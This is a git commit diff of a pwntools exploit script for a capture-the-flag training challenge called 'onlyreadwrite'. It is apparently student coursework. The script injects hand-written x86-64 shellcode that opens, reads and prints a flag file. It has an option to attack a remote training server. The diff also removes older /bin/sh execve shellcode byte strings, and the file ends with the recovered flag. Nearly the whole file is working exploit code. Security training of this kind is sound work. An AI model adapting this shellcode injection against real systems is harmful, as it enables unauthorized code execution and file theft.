8e1b5bab762de75675161ce442b0c31f001a26e1
Alessandro Sironi <100214750+AlessandroSironi@users.noreply.github.com>
2024-01-10 17:35:34 +0100

    onlyreadwrite chall

--- shellcode/onlyreadwrite/x.py
+++ shellcode/onlyreadwrite/x.py
@@ -1,23 +1,101 @@
 from pwn import *
+import sys
 import time
 
-context.terminal = ['tmux', 'splitw', '-h']
+context.arch = 'amd64'
 
-r = process("./onlyreadwrite")
-""" gdb.attach(r,'''
-        patch 0x4014a4 nop; nop; nop
-        b *0x04014d9
-        c
-        ''') """
-gdb.attach(r)
-input("wait")
+if(len(sys.argv) > 1):
+	if(sys.argv[1] == '--debug'):
+		p = process("./onlyreadwrite")
+		gdb.attach(p, """
+		# b *play+601
+		"""	)
+		input("wait...")
+	elif(sys.argv[1] == '--strace'):
+		p = process(["strace", "./onlyreadwrite"])
+	elif(sys.argv[1] == '--remote'):
+		p = remote("bin.training.offdef.it", 2006)
+else:
+	p = process("./onlyreadwrite")
+
+shellcode = pwnlib.shellcraft.amd64.linux.open('./flag', 0, 0)
+shellcode += pwnlib.shellcraft.amd64.linux.read(3, 'rsp', 100)
+shellcode += pwnlib.shellcraft.amd64.linux.write(1, 'rsp', 100)
+
+shellcode = """
+   mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x67616c662f2e
+    xor [rsp], rax
+    mov rdi, rsp
+    xor edx, edx /* 0 */
+    xor esi, esi /* 0 */
+    /* call open() */
+    push SYS_open /* 2 */
+    pop rax
+    syscall
+    /* call read(3, 'rsp', 0x64) */
+    push rax
+    xor eax, eax /* SYS_read */
+    pop rdi
+    push 0x64
+    pop rdx
+    mov rsi, rsp
+    syscall
+    /* write(fd=1, buf='rsp', n=0x64) */
+    push 1
+    pop rdi
+    push 0x64
+    pop rdx
+    mov rsi, rsp
+    /* call write() */
+    push SYS_write /* 1 */
+    pop rax
+    syscall
+
+"""
+
+print(shellcode)
+
+p.sendline(asm(shellcode))
+
+p.interactive()
+
+""" 
+; push './flag' on the stack
+mov rax, 0x101010101010101
+push rax
+mov rax, 0x101010101010101 ^ 0x67616c662f2e
+xor [rsp], rax
+
+; call open(RDI -> './flag', 0, 0)
+mov rdi, rsp
+xor edx, edx /* 0 */
+xor esi, esi /* 0 */
+push SYS_open /* 2 */
+pop rax /* -> 2 */
+syscall
+
+; call read(RDI -> RAX = fd of './flag', RSI = 'rsp', RDX = 0x64)
+push rax
+xor eax, eax /* SYS_read */
+pop rdi ; -> fd  returned by open
+push 0x64
+pop rdx
+mov rsi, rsp
+syscall
+
+; call write(fd=1 (stdout), RSI = 'rsp', RDX =0x64)
+push 1
+pop rdi
+push 0x64
+pop rdx
+mov rsi, rsp
+push SYS_write ; 1
+pop rax
+syscall
 
 
-r.send(b"\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05")
-#time.sleep(0.1)
-#r.send(b"\x48\xBF\x00\xA0\xFF\xF7\xFF\x7F\x00\x00\x48\x83\xC7\x2C\x48\x31\xF6\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")
-#r.send(b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF7\x48\x83\xC7\x4F\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")
+# Basically it is opening the file, reading it on the stack and then writing it on stdout. """
 
-#r.send(b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF7\x48\x83\xC7\x3D\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")
-r.send(b"\x90\x90\x90\x90")
-r.interactive()
+# Flag: flag{sometimes_you_do_not_need_a_shell_!}
